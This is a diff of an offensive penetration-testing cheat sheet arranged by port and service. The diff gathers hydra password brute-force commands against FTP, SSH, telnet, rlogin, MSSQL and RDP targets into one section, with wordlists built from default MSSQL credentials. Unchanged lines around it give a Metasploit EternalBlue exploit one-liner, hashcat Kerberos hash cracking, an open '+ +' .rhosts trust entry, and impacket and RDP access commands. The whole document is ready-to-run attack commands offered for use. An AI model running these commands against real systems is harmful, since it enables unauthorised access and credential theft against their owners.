@@ -369,11 +369,24 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 9500	MS Office 2010
 9600	MS Office 2013
 
+[*] Bruteforce
++---------- Wordlists ----------+
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
+/usr/share/wordlists/rockyou.txt
+
++---------- Hydra ----------+
+hydra ftp://$TARGET -L usernames -P passwords -t35
+hydra ssh://$TARGET -L usernames -P passwords -t35
+hydra telnet://$TARGET  -L usernames -P passwords -t35
+hydra rlogin://$TARGET -L usernames -P passwords -t35
+hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35
+hydra rdp://$TARGET -L usernames -P passwords -t35
+
 [*] (21) FTP
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -m -q --no-parent --cut-dirs=1 --no-directories -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
-hydra -L usernames -P passwords ftp://$TARGET -t35
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 
 ftp '$USERNAME'@"$TARGET"
@@ -384,8 +397,6 @@ ascii
 get file.txt -
 
 [*] (22) SSH
-hydra ssh://$TARGET -L usernames -P passwords -t35
-
 ssh-add -D
 
 yes | ssh-keygen -t ed25519 -f key -N '' > /dev/null; cat key.pub
@@ -397,9 +408,7 @@ $USERNAME@$TARGET -i key.pub
 nano key; chmod 600 key; $USERNAME@$TARGET -i key -o PubkeyAcceptedAlgorithms=ssh-rsa
 
 [*] (23) Telnet
-hydra telnet://$TARGET  -L usernames -P passwords -t35
-
-telnet --user $USERNAME $TARGET
+telnet --user '$USERNAME' $TARGET
 
 [*] (25) SMTP
 nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET
@@ -568,17 +577,10 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
-hydra rlogin://$TARGET -L usernames -P passwords -t35
-
 echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
 
 [*] (1433) MSSQL
-cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
-cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
-
-hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35
-
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
@@ -616,10 +618,7 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 mysql -h "$TARGET" -u root@localhost -e 'show databases;'
 
 [*] (3389) RDP
-hydra rdp://$TARGET -L usernames -P passwords -t35
-
 xfreerdp /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
-
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
 
 [*] (5985) WINRM
